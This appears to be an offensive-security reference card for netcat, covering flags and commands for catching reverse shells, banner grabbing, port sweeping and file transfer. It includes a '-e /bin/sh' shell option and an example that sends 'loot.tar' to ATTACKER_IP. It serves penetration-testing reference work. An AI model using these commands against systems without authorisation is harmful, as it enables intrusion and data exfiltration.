---
tool: netcat
slug: netcat
stages: [misc]
targets: [windows, linux]
category: The TCP/UDP swiss-army knife
platforms: [linux, windows]
services: []
ports: []
tags: [shells, listener, banner grab, file transfer, port scan, networking]
attack: [T1095, T1571, T1046]
summary: Reads and writes raw TCP/UDP connections, which makes it the default tool for a dozen small jobs: catching a reverse shell, grabbing a service banner, a quick port check, and moving a file when nothing fancier is available. The piece of plumbing every engagement leans on.
references:
  - Ncat (Nmap) | https://nmap.org/ncat/
  - netcat man page | https://linux.die.net/man/1/nc
---

## When to reach for it

Almost any time you need a raw connection: a listener to catch a shell, a one-line banner grab to identify a service, a file transfer over a plain socket, or a fast check that a port is really open. When a purpose-built tool is overkill or missing, `nc` is already there.

## Key flags

- `-l`: listen mode. `-p PORT`: the port. `-n`: no DNS. `-v`: verbose.
- `-lvnp PORT`: the usual listener (catch a shell, receive a file).
- `-w 3`: connection/read timeout in seconds.
- `-u`: UDP instead of TCP.
- `-e /bin/sh`: run a program on connect (bind/reverse shell; `ncat --exec`).

## Commands

Catch a reverse shell:

```bash
nc -lvnp PORT
```

Banner-grab a service to fingerprint it:

```bash
nc -nv HOST 25
```

Transfer a file (receiver listens, sender connects):

```bash
# receiver
nc -lvnp PORT > loot.tar
# sender
nc -w 3 ATTACKER_IP PORT < loot.tar
```

Quick port sweep without Nmap:

```bash
nc -zvn HOST 1-1024
```

## Workflow

1. For shells, start `nc -lvnp PORT` before you fire the payload that connects back.
2. For enumeration, banner-grab odd ports `nmap` could not identify.
3. For transfers on a locked-down box, use a listener/sender pair over an allowed port.
4. Upgrade a caught shell to a proper TTY straight away (see the shell-upgrade note).

## Notes

There are several netcat flavours — traditional (`-e` for shells), BSD (`-e` removed, use a FIFO trick), and `ncat` from Nmap (adds `--ssl` and `--exec`). Check which you have before relying on `-e`. For anything beyond a one-off — a stable interactive shell, an encrypted channel, or multi-host pivoting — socat and the dedicated tunnellers are sturdier; netcat's strength is being everywhere and instant.
